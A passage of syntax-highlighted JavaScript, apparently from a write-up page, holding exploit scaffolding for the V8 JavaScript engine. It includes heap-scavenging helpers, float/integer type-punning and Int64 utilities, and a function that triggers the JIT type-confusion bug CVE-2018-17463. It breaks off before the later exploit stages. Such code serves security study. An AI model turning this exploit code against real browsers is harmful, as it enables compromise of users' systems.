class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-comment">/*fill-up the 1MB semi-space page, force V8 to scavenge NewSpace.*/</span></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) / <span class="hljs-number">0x10</span>); i++) {</span><br><span class="line">    <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">give_me_a_clean_newspace</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-comment">/*force V8 to scavenge NewSpace twice to get a clean NewSpace.*/</span></span><br><span class="line">  gc()</span><br><span class="line">  gc()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> floatView = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(<span class="hljs-number">1</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> uint64View = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BigUint64Array</span>(floatView.buffer);</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">Number</span>.prototype.toBigInt = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toBigInt</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  floatView[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> uint64View[<span class="hljs-number">0</span>];</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">BigInt</span>.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hex</span>(<span class="hljs-params">b</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> (<span class="hljs-string">'0'</span> + b.toString(<span class="hljs-number">16</span>)).substr(-<span class="hljs-number">2</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Return the hexadecimal representation of the given byte array.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hexlify</span>(<span class="hljs-params">bytes</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> res = [];</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; bytes.length; i++)</span><br><span class="line">    res.push(hex(bytes[i]));</span><br><span class="line">  <span class="hljs-keyword">return</span> res.join(<span class="hljs-string">''</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Return the binary data represented by the given hexdecimal string.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unhexlify</span>(<span class="hljs-params">hexstr</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (hexstr.length % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">TypeError</span>(<span class="hljs-string">"Invalid hex string"</span>);</span><br><span class="line">  <span class="hljs-keyword">var</span> bytes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(hexstr.length / <span class="hljs-number">2</span>);</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; hexstr.length; i += <span class="hljs-number">2</span>)</span><br><span class="line">    bytes[i / <span class="hljs-number">2</span>] = <span class="hljs-built_in">parseInt</span>(hexstr.substr(i, <span class="hljs-number">2</span>), <span class="hljs-number">16</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> bytes;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hexdump</span>(<span class="hljs-params">data</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="hljs-string">'undefined'</span>)</span><br><span class="line">    data = <span class="hljs-built_in">Array</span>.from(data);</span><br><span class="line">  <span class="hljs-keyword">var</span> lines = [];</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; data.length; i += <span class="hljs-number">16</span>) {</span><br><span class="line">    <span class="hljs-keyword">var</span> chunk = data.slice(i, i + <span class="hljs-number">16</span>);</span><br><span class="line">    <span class="hljs-keyword">var</span> parts = chunk.map(hex);</span><br><span class="line">    <span class="hljs-keyword">if</span> (parts.length &gt; <span class="hljs-number">8</span>)</span><br><span class="line">      parts.splice(<span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-string">' '</span>);</span><br><span class="line">    lines.push(parts.join(<span class="hljs-string">' '</span>));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> lines.join(<span class="hljs-string">'\n'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Simplified version of the similarly named python module.</span></span><br><span class="line"><span class="hljs-keyword">var</span> Struct = (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-comment">// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span></span><br><span class="line">  <span class="hljs-keyword">var</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">8</span>);</span><br><span class="line">  <span class="hljs-keyword">var</span> byteView = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(buffer);</span><br><span class="line">  <span class="hljs-keyword">var</span> uint32View = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(buffer);</span><br><span class="line">  <span class="hljs-keyword">var</span> float64View = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(buffer);</span><br><span class="line">  <span class="hljs-keyword">return</span> {</span><br><span class="line">    <span class="hljs-attr">pack</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">type, value</span>) </span>{</span><br><span class="line">      <span class="hljs-keyword">var</span> view = type;        <span class="hljs-comment">// See below</span></span><br><span class="line">      view[<span class="hljs-number">0</span>] = value;</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(buffer, <span class="hljs-number">0</span>, type.BYTES_PER_ELEMENT);</span><br><span class="line">    },</span><br><span class="line">    <span class="hljs-attr">unpack</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">type, bytes</span>) </span>{</span><br><span class="line">      <span class="hljs-keyword">if</span> (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"Invalid bytearray"</span>);</span><br><span class="line">      <span class="hljs-keyword">var</span> view = type;        <span class="hljs-comment">// See below</span></span><br><span class="line">      byteView.set(bytes);</span><br><span class="line">      <span class="hljs-keyword">return</span> view[<span class="hljs-number">0</span>];</span><br><span class="line">    },</span><br><span class="line">    <span class="hljs-comment">// Available types.</span></span><br><span class="line">    <span class="hljs-attr">int8</span>: byteView,</span><br><span class="line">    <span class="hljs-attr">int32</span>: uint32View,</span><br><span class="line">    <span class="hljs-attr">float64</span>: float64View</span><br><span class="line">  };</span><br><span class="line">})();</span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Tiny module that provides big (64bit) integers.</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Copyright (c) 2016 Samuel Groß</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Requires utils.js</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Datatype to represent 64-bit integers.</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Internally, the integer is stored as a Uint8Array in little endian byte order.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Int64</span>(<span class="hljs-params">v</span>) </span>{</span><br><span class="line">  <span class="hljs-comment">// The underlying byte array.</span></span><br><span class="line">  <span class="hljs-keyword">var</span> bytes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(<span class="hljs-number">8</span>);</span><br><span class="line">  <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">typeof</span> v) {</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-string">'number'</span>:</span><br><span class="line">      v = <span class="hljs-string">'0x'</span> + <span class="hljs-built_in">Math</span>.floor(v).toString(<span class="hljs-number">16</span>);</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-string">'string'</span>:</span><br><span class="line">      <span class="hljs-keyword">if</span> (v.startsWith(<span class="hljs-string">'0x'</span>))</span><br><span class="line">        v = v.substr(<span class="hljs-number">2</span>);</span><br><span class="line">      <span class="hljs-keyword">if</span> (v.length % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)</span><br><span class="line">        v = <span class="hljs-string">'0'</span> + v;</span><br><span class="line">      <span class="hljs-keyword">var</span> bigEndian = unhexlify(v, <span class="hljs-number">8</span>);</span><br><span class="line">      bytes.set(<span class="hljs-built_in">Array</span>.from(bigEndian).reverse());</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-string">'object'</span>:</span><br><span class="line">      <span class="hljs-keyword">if</span> (v <span class="hljs-keyword">instanceof</span> Int64) {</span><br><span class="line">        bytes.set(v.bytes());</span><br><span class="line">      } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (v.length != <span class="hljs-number">8</span>)</span><br><span class="line">          <span class="hljs-keyword">throw</span> <span class="hljs-built_in">TypeError</span>(<span class="hljs-string">"Array must have excactly 8 elements."</span>);</span><br><span class="line">        bytes.set(v);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-string">'undefined'</span>:</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">default</span>:</span><br><span class="line">      <span class="hljs-keyword">throw</span> <span class="hljs-built_in">TypeError</span>(<span class="hljs-string">"Int64 constructor requires an argument."</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">// Return a double whith the same underlying bit representation.</span></span><br><span class="line">  <span class="hljs-built_in">this</span>.asDouble = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span><br><span class="line">    <span class="hljs-comment">// Check for NaN</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (bytes[<span class="hljs-number">7</span>] == <span class="hljs-number">0xff</span> &amp;&amp; (bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0xff</span> || bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0xfe</span>))</span><br><span class="line">      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RangeError</span>(<span class="hljs-string">"Integer can not be represented by a double"</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> Struct.unpack(Struct.float64, bytes);</span><br><span class="line">  };</span><br><span class="line">  <span class="hljs-comment">// Return a javascript value with the same underlying bit representation.</span></span><br><span class="line">  <span class="hljs-comment">// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span></span><br><span class="line">  <span class="hljs-comment">// due to double conversion constraints.</span></span><br><span class="line">  <span class="hljs-built_in">this</span>.asJSValue = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> ((bytes[<span class="hljs-number">7</span>] == <span class="hljs-number">0</span> &amp;&amp; bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0</span>) || (bytes[<span class="hljs-number">7</span>] == <span class="hljs-number">0xff</span> &amp;&amp; bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0xff</span>))</span><br><span class="line">      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RangeError</span>(<span class="hljs-string">"Integer can not be represented by a JSValue"</span>);</span><br><span class="line">    <span class="hljs-comment">// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.</span></span><br><span class="line">    <span class="hljs-built_in">this</span>.assignSub(<span class="hljs-built_in">this</span>, <span class="hljs-number">0x1000000000000</span>);</span><br><span class="line">    <span class="hljs-keyword">var</span> res = Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    <span class="hljs-built_in">this</span>.assignAdd(<span class="hljs-built_in">this</span>, <span class="hljs-number">0x1000000000000</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> res;</span><br><span class="line">  };</span><br><span class="line">  <span class="hljs-comment">// Return the underlying bytes of this number as array.</span></span><br><span class="line">  <span class="hljs-built_in">this</span>.bytes = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.from(bytes);</span><br><span class="line">  };</span><br><span class="line">  <span class="hljs-comment">// Return the byte at the given index.</span></span><br><span class="line">  <span class="hljs-built_in">this</span>.byteAt = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">i</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> bytes[i];</span><br><span class="line">  };</span><br><span class="line">  <span class="hljs-comment">// Return the value of this number as unsigned hex string.</span></span><br><span class="line">  <span class="hljs-built_in">this</span>.toString = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span> + hexlify(<span class="hljs-built_in">Array</span>.from(bytes).reverse());</span><br><span class="line">  };</span><br><span class="line">  <span class="hljs-comment">// Basic arithmetic.</span></span><br><span class="line">  <span class="hljs-comment">// These functions assign the result of the computation to their 'this' object.</span></span><br><span class="line">  <span class="hljs-comment">// Decorator for Int64 instance operations. Takes care</span></span><br><span class="line">  <span class="hljs-comment">// of converting arguments to Int64 instances if required.</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">operation</span>(<span class="hljs-params">f, nargs</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">arguments</span>.length != nargs)</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"Not enough arguments for function "</span> + f.name);</span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">arguments</span>.length; i++)</span><br><span class="line">        <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">arguments</span>[i] <span class="hljs-keyword">instanceof</span> Int64))</span><br><span class="line">          <span class="hljs-built_in">arguments</span>[i] = <span class="hljs-keyword">new</span> Int64(<span class="hljs-built_in">arguments</span>[i]);</span><br><span class="line">      <span class="hljs-keyword">return</span> f.apply(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">arguments</span>);</span><br><span class="line">    };</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">// this = -n (two's complement)</span></span><br><span class="line">  <span class="hljs-built_in">this</span>.assignNeg = operation(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">neg</span>(<span class="hljs-params">n</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)</span><br><span class="line">      bytes[i] = ~n.byteAt(i);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.assignAdd(<span class="hljs-built_in">this</span>, Int64.One);</span><br><span class="line">  }, <span class="hljs-number">1</span>);</span><br><span class="line">  <span class="hljs-comment">// this = a + b</span></span><br><span class="line">  <span class="hljs-built_in">this</span>.assignAdd = operation(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params">a, b</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">var</span> carry = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) {</span><br><span class="line">      <span class="hljs-keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">      carry = cur &gt; <span class="hljs-number">0xff</span> | <span class="hljs-number">0</span>;</span><br><span class="line">      bytes[i] = cur;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;</span><br><span class="line">  }, <span class="hljs-number">2</span>);</span><br><span class="line">  <span class="hljs-comment">// this = a - b</span></span><br><span class="line">  <span class="hljs-built_in">this</span>.assignSub = operation(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sub</span>(<span class="hljs-params">a, b</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">var</span> carry = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) {</span><br><span class="line">      <span class="hljs-keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">      carry = cur &lt; <span class="hljs-number">0</span> | <span class="hljs-number">0</span>;</span><br><span class="line">      bytes[i] = cur;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;</span><br><span class="line">  }, <span class="hljs-number">2</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span></span><br><span class="line">Int64.fromDouble = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">d</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> bytes = Struct.pack(Struct.float64, d);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Int64(bytes);</span><br><span class="line">};</span><br><span class="line"><span class="hljs-comment">// Convenience functions. These allocate a new Int64 to hold the result.</span></span><br><span class="line"><span class="hljs-comment">// Return -n (two's complement)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Neg</span>(<span class="hljs-params">n</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> Int64()).assignNeg(n);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Return a + b</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Add</span>(<span class="hljs-params">a, b</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> Int64()).assignAdd(a, b);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Return a - b</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Sub</span>(<span class="hljs-params">a, b</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> Int64()).assignSub(a, b);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Some commonly used numbers.</span></span><br><span class="line">Int64.Zero = <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0</span>);</span><br><span class="line">Int64.One = <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">utf8ToString</span>(<span class="hljs-params">h, p</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> s = <span class="hljs-string">""</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> (i = p; h[i]; i++) {</span><br><span class="line">    s += <span class="hljs-built_in">String</span>.fromCharCode(h[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> s;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">x, y = <span class="hljs-string">' '</span></span>) </span>{</span><br><span class="line">  print(<span class="hljs-string">"[+] log:"</span>, x, y);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// =================== //</span></span><br><span class="line"><span class="hljs-comment">//     Start here!     //</span></span><br><span class="line"><span class="hljs-comment">// =================== //</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_vul</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vuln</span>(<span class="hljs-params">x</span>) </span>{</span><br><span class="line">    x.a;</span><br><span class="line">    <span class="hljs-built_in">Object</span>.create(x);</span><br><span class="line">    <span class="hljs-keyword">return</span> x.b;</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {</span><br><span class="line">    <span class="hljs-keyword">let</span> x = { <span class="hljs-attr">a</span>: <span class="hljs-number">0x1234</span> };</span><br><span class="line">    x.b = <span class="hljs-number">0x5678</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> res = vuln(x);</span><br><span class="line">    <span class="hljs-keyword">if</span> (res != <span class="hljs-number">0x5678</span>) {</span><br><span class="line">      log(<span class="hljs-string">"CVE-2018-17463 exists in the d8"</span>);</span><br><span class="line">      <span class="hljs-keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">throw</span> <span class="hljs-string">"bad d8 version"</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getObj</span>(<span class="hljs-params">values</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> obj = { <span class="hljs-attr">a</span>: <span class="hljs-number">1234</span> };</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = 